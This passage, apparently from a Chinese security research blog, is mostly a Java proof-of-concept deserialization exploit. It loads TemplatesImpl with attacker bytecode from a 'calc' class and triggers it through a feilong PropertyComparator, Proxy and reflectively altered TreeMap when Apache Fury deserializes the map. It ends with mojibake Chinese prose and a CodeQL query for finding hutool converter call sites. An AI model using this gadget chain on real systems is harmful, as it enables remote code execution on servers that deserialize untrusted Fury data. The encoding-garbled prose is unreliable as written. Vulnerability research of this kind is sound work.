</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.feilong.core.util.comparator.PropertyComparator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.feilong.lib.collection4.iterators.FilterIterator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.feilong.lib.digester3.ObjectCreationFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.google.common.collect.ArrayListMultimap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.google.common.collect.Multimap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.fury.Fury</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.fury.config.Language</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.fury.serializer.JavaSerializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.invoke.SerializedLambda</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.TreeMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.google.common.base.Predicate</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">compare_test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">calc</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()).</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">tmpl</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">bytecodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bytecodes</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bytecodes</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tmpl</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">bytes</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;_name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tmpl</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">tmpl1</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w">    </span><span class="n">bytecodes1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bytecodes1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bytecodes1</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tmpl1</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">bytes</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">name1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;_name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name1</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tmpl1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;hello2&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">///templates</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        String prop = &#34;digester&#34;;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">prop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;digester&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PropertyComparator</span><span class="w"> </span><span class="n">propertyComparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PropertyComparator</span><span class="p">(</span><span class="n">prop</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">TreeMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TreeMap</span><span class="p">(</span><span class="n">propertyComparator</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">templatesImpl1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmpl1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">templatesImpl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PropertyComparator</span><span class="w"> </span><span class="n">propertyComparator1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PropertyComparator</span><span class="p">(</span><span class="s">&#34;outputProperties&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">propertyComparator1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReflectUtil</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">priorityQueue1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;size&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">objectsjdk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">templatesImpl1</span><span class="p">,</span><span class="w"> </span><span class="n">templatesImpl</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">priorityQueue1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;queue&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">objectsjdk</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">/////jdk</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SerializeUtil</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">priorityQueue1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">hashmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">prop</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">MapProxy</span><span class="w"> </span><span class="n">mapProxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MapProxy</span><span class="p">(</span><span class="n">hashmap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectCreationFactory</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectCreationFactory</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">ObjectCreationFactory</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">ObjectCreationFactory</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">mapProxy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectCreationFactory</span><span class="w">  </span><span class="n">test1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectCreationFactory</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">ObjectCreationFactory</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">ObjectCreationFactory</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">mapProxy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TreeMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">test</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TreeMap.put(test1,2);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        setFieldValue(TreeMap,&#34;comparator&#34;, propertyComparator);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TreeMap.put(1234,123);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TreeMap.put(1234,123);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        root = new TreeMap.Entry&lt;&gt;(&#34;key&#34;, &#34;value&#34;, null);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.TreeMap$Entry&#34;</span><span class="p">).</span><span class="na">getDeclaredConstructors</span><span class="p">()</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">root_test1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="w"> </span><span class="n">test1</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TreeMap</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;root&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">root</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">Troot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">left</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Troot</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;right&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">left</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">left</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">Troot</span><span class="p">,</span><span class="w"> </span><span class="n">root_test1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">root</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">,</span><span class="w"> </span><span class="n">Troot</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">,</span><span class="s">&#34;size&#34;</span><span class="p">,</span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">,</span><span class="s">&#34;modCount&#34;</span><span class="p">,</span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TreeMap.put(test1,1232);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        BiMap hashMap = new BiMap(hashMap1);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Fury</span><span class="w"> </span><span class="n">fury</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fury</span><span class="p">.</span><span class="na">builder</span><span class="p">().</span><span class="na">withLanguage</span><span class="p">(</span><span class="n">Language</span><span class="p">.</span><span class="na">JAVA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">.</span><span class="na">requireClassRegistration</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">.</span><span class="na">build</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fury</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">deserialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fury</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">serialize</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å·®ä¸å¤šå°±å…ˆè¿™æ ·å§</p>
<p>å…¶å®æˆ‘qlæœ€åˆè·¯èµ°åäº†ï¼Œç„¶åæˆ‘å°±åƒé€šè¿‡callè¿™ç§å‘ä¸Šæ‰¾ï¼ˆconverté‚£ä¸ªç‚¹ï¼‰ï¼Œä¸ºä»€ä¹ˆä¸ç”¨tabbyå‘¢ï¼ˆæˆ‘æ‰¾å‡ºæ¥å¾ˆä¸å…¨ï¼‰ï¼Œ</p>
<p>ç„¶åæˆ‘å°±å»æ‰¾<code>AbstractConverter#convert</code>ä¼šæœ‰å“ªäº›è°ƒç”¨åˆ°ï¼Œä½†æ˜¯å§‹ç»ˆæ‰¾ä¸å…¨ï¼Œideaæ˜¯æœ‰16ä¸ªï¼Œtabby8ä¸ªï¼Œqlå§‹ç»ˆæ˜¯åªæœ‰13ä¸ªã€‚ç„¶åå»çœ‹qlæ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´çš„ã€‚å‘ç°æœ‰ä¸ªç‚¹ä½åº”è¯¥è¢«æ‰¾åˆ°çš„ä½†æ˜¯ç»“æœé‡Œé¢æ²¡æœ‰ï¼ˆè§ä¸‹å›¾ï¼‰ï¼Œ<code>DateConverter.convert</code>è¿™ä¸ªç‚¹å’Œä¸‹é¢<code>TemporalAccessorConverter</code>è¿™ä¸ªæ¡ä»¶è‚¯å®šæ˜¯ä¸€æ ·çš„ã€‚DateConverteræ˜¯ç»§æ‰¿<code>AbstractConverter&lt;Date&gt;</code>æ˜¯ç¬¦åˆçš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰¾ä¸åˆ°ï¼Œç„¶åæ‰¾äº†å¯¹åº”çš„ç±»<code>NumberWithFormat</code>æ‰€æœ‰çš„callerç‚¹ï¼Œä¹Ÿæ˜¯æ²¡<code>DateConverter.convert</code>ï¼ˆæ„Ÿè§‰æ˜¯æ•°æ®åº“ç”Ÿæˆ<code>èŠ‚ç‚¹</code>çš„é—®é¢˜å•Šï¼Œæœ‰å¤§å“¥æ‡‚çš„ï¼Œè§£ç­”ä¸‹å°å¼Ÿï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">RefType</span><span class="w"> </span><span class="n">abstractConverter</span><span class="p">,</span><span class="w"> </span><span class="n">RefType</span><span class="w"> </span><span class="n">subclass</span><span class="p">,</span><span class="k">Method</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="n">MethodCall</span><span class="w"> </span><span class="n">mcall</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">(</span><span class="n">abstractConverter</span><span class="p">.</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.Converter&lt;%&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">abstractConverter</span><span class="p">.</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.Converter&#34;</span><span class="p">)</span><span class="w">  </span><span class="p">)</span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">subclass</span><span class="p">.</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">abstractConverter</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">()</span><span class="o">=</span><span class="n">subclass</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">hasName</span><span class="p">(</span><span class="s2">&#34;convert&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="n">mcall</span><span class="p">.</span><span class="n">getMethod</span><span class="p">()</span><span class="o">=</span><span class="n">m</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.Converter%&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.AbstractConverter%&#34;</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="n">mcall</span><span class="p">,</span><span class="n">mcall</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getDeclaringType</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250427175601606.png" alt="image-20250427175601606"  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>jdk7u21&amp; 8u20 æ·±åº¦åˆ†æ</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
